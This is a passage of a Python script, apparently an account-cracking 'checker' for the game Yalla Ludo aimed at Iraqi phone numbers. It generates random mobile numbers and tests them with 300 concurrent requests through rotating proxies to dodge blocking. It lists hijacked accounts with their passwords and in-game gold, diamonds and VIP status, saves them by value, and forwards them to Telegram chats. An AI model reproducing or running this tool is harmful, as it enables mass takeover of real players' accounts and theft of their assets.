    5M-9.9M   : {gold_stats.get('5M-9.9M', 0)}
    10M-19M   : {gold_stats.get('10M-19M', 0)}
    20M-49M   : {gold_stats.get('20M-49M', 0)}
    50M-99M   : {gold_stats.get('50M-99M', 0)}
    100M+     : {gold_stats.get('100M+', 0)}

------------------------------------------------------------

  DIAMOND CATEGORIES:
    0-9.9K    : {diamond_stats.get('0-9.9K', 0)}
    10K-49K   : {diamond_stats.get('10K-49K', 0)}
    50K-99K   : {diamond_stats.get('50K-99K', 0)}
    100K-499K : {diamond_stats.get('100K-499K', 0)}
    500K-999K : {diamond_stats.get('500K-999K', 0)}
    1M+       : {diamond_stats.get('1M+', 0)}

------------------------------------------------------------

  LEVEL CATEGORIES:
    Level 0-9   : {level_stats.get('Level 0-9', 0)}
    Level 10-19 : {level_stats.get('Level 10-19', 0)}
    Level 20-29 : {level_stats.get('Level 20-29', 0)}
    Level 30-39 : {level_stats.get('Level 30-39', 0)}
    Level 40+   : {level_stats.get('Level 40+', 0)}

------------------------------------------------------------

  LAST FOUND ACCOUNTS:
"""
        for acc in found_accounts[-5:]:
            vip_status = "VIP" if acc['is_vip'] else "Non-VIP"
            output += f"    {acc['phone']} | Pass: {acc['password']} | Gold:{acc['gold']} | Diamond:{acc['diamond']} | Lv:{acc['level']} | {vip_status}\n"
        if not found_accounts:
            output += "    No accounts found yet...\n"
        
        output += f"""
------------------------------------------------------------
  By @to_ls | Proxies: {len(proxy_manager.proxies) if proxy_manager else 0} (Working: {len(proxy_manager.working_proxies) if proxy_manager else 0})
"""
        return output

def dashboard_loop():
    if RICH_AVAILABLE:
        with Live(create_dashboard(), refresh_per_second=1, screen=True) as live:
            while not stop_flag:
                live.update(create_dashboard())
                time.sleep(1)
    else:
        while not stop_flag:
            os.system('cls' if os.name == 'nt' else 'clear')
            print(create_dashboard())
            time.sleep(1)

async def main_async():
    global stop_flag, BOT_TOKEN, CHAT_IDS, proxy_manager
    
    if RICH_AVAILABLE:
        console.print(Panel("Yalla Ludo - Fast Checker - Iraq Only\nWith Residential Proxies Support\nBy @to_ls", style="bold blue", box=box.HEAVY))
    else:
        print("""
============================================================
     Yalla Ludo - Fast Checker - Iraq Only
     Speed + Full Account Info
     With Residential Proxies Support
     By @to_ls
============================================================
        """)
    
    print("\n[+] Enter Configuration:")
    
    proxy_path = input("Proxy file path (press Enter to skip): ").strip()
    if proxy_path:
        proxy_manager = ProxyManager(proxy_path)
    else:
        proxy_manager = ProxyManager()
        print("[!] Running without proxies")
    
    BOT_TOKEN = input("Telegram Bot Token (press Enter to skip): ").strip()
    
    if BOT_TOKEN:
        chat_ids_input = input("Telegram Chat IDs (comma separated, e.g., 123,456): ").strip()
        if chat_ids_input:
            CHAT_IDS = [x.strip() for x in chat_ids_input.split(',') if x.strip()]
            print(f"[+] Will send to {len(CHAT_IDS)} recipients")
        else:
            print("[!] No chat IDs provided, Telegram disabled")
            BOT_TOKEN = ""
    else:
        print("[!] No bot token provided, Telegram disabled")
    
    print("\n[+] Starting checker...\n")
    print("[+] Accounts will be saved in 'accounts_by_gold/' folder by gold amount")
    print("[+] Passwords will be copied to clipboard automatically\n")
    
    concurrency = 300
    semaphore = asyncio.Semaphore(concurrency)
    
    threading.Thread(target=dashboard_loop, daemon=True).start()
    
    connector = aiohttp.TCPConnector(
        limit=concurrency*2,
        limit_per_host=concurrency,
        force_close=False
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        while not stop_flag:
            mobile = generate_mobile_iq()
            proxy = proxy_manager.get_proxy() if proxy_manager else None
            task = asyncio.create_task(check_number_async(session, mobile, semaphore, proxy))
            tasks.append(task)
            
            if len(tasks) > 2000:
                done, pending = await asyncio.wait(tasks[:500], return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending) + tasks[500:]
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

def run():
    asyncio.run(main_async())

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print("\n[yellow][!][/yellow] Stopped.")
            console.print("\n[bold green]Final Report:[/bold green]")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                console.print(f"  Time: [green]{hours:02d}:{minutes:02d}:{seconds:02d}[/green]")
                console.print(f"  Hits: [green]{stats['good']}[/green]")
                console.print(f"  Verify: [yellow]{stats['verification_needed']}[/yellow]")
                console.print(f"  VIP: [magenta]{vip_stats.get('VIP', 0)}[/magenta]")
                console.print(f"  Non-VIP: [white]{vip_stats.get('Non-VIP', 0)}[/white]")
                console.print("  Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
                console.print("  Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    console.print(f"    - {cat}: [green]{count}[/green]")
            console.print("\n[magenta]By @to_ls[/magenta]")
        else:
            print("\n[!] Stopped.")
            print("\n[+] Final Report:")
            elapsed = int(time.time() - start_time)
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            with stats_lock:
                print(f"    Time: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"    Hits: {stats['good']}")
                print(f"    Verify: {stats['verification_needed']}")
                print(f"    VIP: {vip_stats.get('VIP', 0)}")
                print(f"    Non-VIP: {vip_stats.get('Non-VIP', 0)}")
                print(f"    Gold Categories:")
                for cat, count in sorted(gold_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Diamond Categories:")
                for cat, count in sorted(diamond_stats.items()):
                    print(f"      - {cat}: {count}")
                print(f"    Level Categories:")
                for cat, count in sorted(level_stats.items()):
                    print(f"      - {cat}: {count}")
            print("\nBy @to_ls")
